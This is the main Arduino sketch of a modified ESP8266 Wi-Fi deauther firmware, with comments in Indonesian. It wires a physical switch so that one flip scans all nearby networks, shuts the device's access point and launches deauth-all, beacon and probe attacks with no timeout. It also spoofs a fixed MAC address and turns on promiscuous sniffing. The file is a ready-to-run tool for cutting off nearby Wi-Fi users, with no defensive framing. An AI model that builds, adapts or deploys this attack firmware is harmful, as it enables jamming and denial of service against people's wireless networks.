/*
   ===========================================
      Copyright (c) 2018 Stefan Kremser
             github.com/spacehuhn
   ===========================================
*/

extern "C" {
  // Please follow this tutorial:
  // https://github.com/spacehuhn/esp8266_deauther/wiki/Installation#compiling-using-arduino-ide
  // And be sure to have the right board selected
#include "user_interface.h"
}

#include "EEPROMHelper.h"

#include <ArduinoJson.h>
#if ARDUINOJSON_VERSION_MAJOR != 5
// The software was build using ArduinoJson v5.x
// version 6 is still in beta at the time of writing
// go to tools -> manage libraries, search for ArduinoJSON and install version 5
#error Please upgrade/downgrade ArduinoJSON library to version 5!
#endif // if ARDUINOJSON_VERSION_MAJOR != 5

#include "oui.h"
#include "language.h"
#include "functions.h"
#include "Settings.h"
#include "Names.h"
#include "SSIDs.h"
#include "Scan.h"
#include "Attack.h"
#include "CLI.h"
#include "DisplayUI.h"
#include "A_config.h"
#include "webfiles.h"

#include "LED.h"

//static const uint8_t D0   = 16;
//static const uint8_t D1   = 5;
//static const uint8_t D2   = 4;
//static const uint8_t D3   = 0;
//static const uint8_t D4   = 2;
//static const uint8_t D5   = 14;
//static const uint8_t D6   = 12;
//static const uint8_t D7   = 13;
//static const uint8_t D8   = 15;
//static const uint8_t D9   = 3;
//static const uint8_t D10  = 1;

#include <EasyButton.h>
// Instance of the button.
EasyButton button(D1);

// Run-Time Variables //
LED led;
Settings settings;
Names    names;
SSIDs    ssids;
Accesspoints accesspoints;
Stations     stations;
Scan   scan;
Attack attack;
CLI    cli;
DisplayUI displayUI;

#include "wifi.h"

uint32_t autosaveTime = 0;
uint32_t currentTime  = 0;

bool booted = false;
int glblattack = 0;
void SaklarOFF() {
  if (glblattack == 1) {
    if (attack.isRunning()) {
      Serial.println("Menghentikan DeauthAll.");
      scan.stop();             // stop scan
      attack.stop();           // stop attack
      cli.runCommand("DELAY 5s");
      cli.runCommand("stop -a");
      cli.runCommand("DELAY 5s");
      cli.runCommand("startap");
      glblattack = 0;
      digitalWrite(D4, HIGH); // turn LED off
    } else {
      //      Serial.println("Deauth tidak ada yang berjalan, tidak ada yang perlu distop.");
    }
  }
}
void SaklarON() {
  glblattack = 1;
  if (glblattack == 1) {
    if (!attack.isRunning()) {
      Serial.println("Memulai DeauthAll.");
      //      cli.runCommand("attack deauthall"); // start deauth all and beacon attack
      cli.runCommand("set beaconinterval true");
      cli.runCommand("set attacktimeout 0");
      cli.runCommand("scan all -c 90s");
      cli.runCommand("DELAY 5s");
      cli.runCommand("stopap");
      cli.runCommand("DELAY 20s");
      cli.runCommand("attack -da -b -p -no -t 0");
      digitalWrite(D4, LOW); // turn LED on
    } else {
      //      Serial.println("Deauth sudah ada berjalan, jadi tidak bisa.");
    }
  }
}
//void onPressed()
//{
//  Serial.println("SAKLAT TERNYALAKAN MENYALAKAN LED");
//  digitalWrite(D4, LOW);
//}

void setup() {
  // for random generator
  randomSeed(os_random());

  // start serial
  Serial.begin(115200);
  Serial.println();

  // start SPIFFS
  prnt(SETUP_MOUNT_SPIFFS);
  bool spiffsError = !SPIFFS.begin();
  prntln(spiffsError ? SETUP_ERROR : SETUP_OK);

  // Start EEPROM
  EEPROMHelper::begin(EEPROM_SIZE);

#ifdef FORMAT_SPIFFS
  prnt(SETUP_FORMAT_SPIFFS);
  SPIFFS.format();
  prntln(SETUP_OK);
#endif // ifdef FORMAT_SPIFFS

#ifdef FORMAT_EEPROM
  prnt(SETUP_FORMAT_EEPROM);
  EEPROMHelper::format(EEPROM_SIZE);
  prntln(SETUP_OK);
#endif // ifdef FORMAT_EEPROM

  // Format SPIFFS when in boot-loop
  if (spiffsError || !EEPROMHelper::checkBootNum(BOOT_COUNTER_ADDR)) {
    prnt(SETUP_FORMAT_SPIFFS);
    SPIFFS.format();
    prntln(SETUP_OK);

    prnt(SETUP_FORMAT_EEPROM);
    EEPROMHelper::format(EEPROM_SIZE);
    prntln(SETUP_OK);

    EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
  }

  // get time
  currentTime = millis();

  // load settings
#ifndef RESET_SETTINGS
  settings.load();
#else // ifndef RESET_SETTINGS
  settings.reset();
  settings.save();
#endif // ifndef RESET_SETTINGS

  uint8_t mac[6] {0xf8, 0xa4, 0x5f, 0x91, 0x63, 0xf2};
  
  // set mac address
  wifi_set_macaddr(STATION_IF, mac);
  wifi_set_macaddr(SOFTAP_IF, mac);
  
  // start WiFi
  WiFi.mode(WIFI_OFF);
  wifi_set_opmode(STATION_MODE);
  wifi_set_promiscuous_rx_cb([](uint8_t* buf, uint16_t len) {
    scan.sniffer(buf, len);
  });

  // start display
  if (settings.getDisplaySettings().enabled) {
    displayUI.setup();
    displayUI.mode = displayUI.DISPLAY_MODE::INTRO;
  }

  // copy web files to SPIFFS
  copyWebFiles(false);

  // load everything else
  names.load();
  ssids.load();
  cli.load();

  // create scan.json
  scan.setup();

  // set channel
  setWifiChannel(settings.getWifiSettings().channel);

  // load Wifi settings: SSID, password,...
  loadWifiConfigDefaults();

  // dis/enable serial command interface
  if (settings.getCLISettings().enabled) {
    cli.enable();
  } else {
    prntln(SETUP_SERIAL_WARNING);
    Serial.flush();
    Serial.end();
  }

  // start access point/web interface
  if (settings.getWebSettings().enabled) startAP();

  // STARTED
  prntln(SETUP_STARTED);

  // version
  prntln(DEAUTHER_VERSION);

  // setup LED
  led.setup();
  pinMode(D4, OUTPUT);       // enable LED pin
  pinMode(D1, INPUT);  // buttonnya
  digitalWrite(D4, HIGH); // turn LED off

  button.begin();
  // Add the callback function to be called when the given sequence of presses is matched.
  //  button.onSequence(1 /* number of presses */, 2000 /* timeout */, TekanSatuKali /* callback */);
  //  button.onSequence(2 /* number of presses */, 2000 /* timeout */, TekanDuaKali /* callback */);
  //    button.onPressed(onPressed);
}

void loop() {
  currentTime = millis();

  led.update();    // update LED color
  wifiUpdate();    // manage access point
  attack.update(); // run attacks
  displayUI.update();
  cli.update();    // read and run serial input
  scan.update();   // run scan
  ssids.update();  // run random mode, if enabled

  // auto-save
  if (settings.getAutosaveSettings().enabled
      && (currentTime - autosaveTime > settings.getAutosaveSettings().time)) {
    autosaveTime = currentTime;
    names.save(false);
    ssids.save(false);
    settings.save(false);
  }

  if (!booted) {
    booted = true;
    EEPROMHelper::resetBootNum(BOOT_COUNTER_ADDR);
#ifdef HIGHLIGHT_LED
    displayUI.setupLED();
#endif // ifdef HIGHLIGHT_LED
  } 

  button.read();
  //    if(button.wasReleased()) {
  ////      Serial.println("Button Ter Rilis, Mematikan Led");
  //      digitalWrite(D4, HIGH);
  //    }

  //    Serial.print("Posisi saklar saat ini:");
  //    Serial.println(digitalRead(D1));
  if (booted && digitalRead(D1) == 0) {
    SaklarON();
  }
  if (digitalRead(D1) == 1) {
    SaklarOFF();
  }
}
